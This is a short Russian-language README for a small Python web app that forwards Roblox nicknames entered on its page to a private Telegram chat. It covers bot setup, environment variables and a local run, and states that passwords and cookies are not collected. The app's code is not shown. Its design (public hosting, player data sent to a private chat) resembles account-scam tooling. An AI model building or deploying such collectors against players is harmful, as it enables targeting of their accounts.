ЗАПУСК
1. Установи Python.
2. В терминале этой папки: pip install -r requirements.txt
3. Создай бота через @BotFather. Узнай chat_id, отправив боту /start и открыв https://api.telegram.org/bot<TOKEN>/getUpdates (не публикуй токен).
4. Windows PowerShell:
$env:TELEGRAM_BOT_TOKEN="токен"
$env:TELEGRAM_CHAT_ID="chat_id"
5. Запусти: python app.py
6. Открой http://127.0.0.1:5000

В Telegram отправляется только ник Roblox. Пароли, cookie и коды подтверждения не собираются. Вход идёт на https://www.roblox.com/login. Для публичного сайта нужен хостинг с HTTPS.
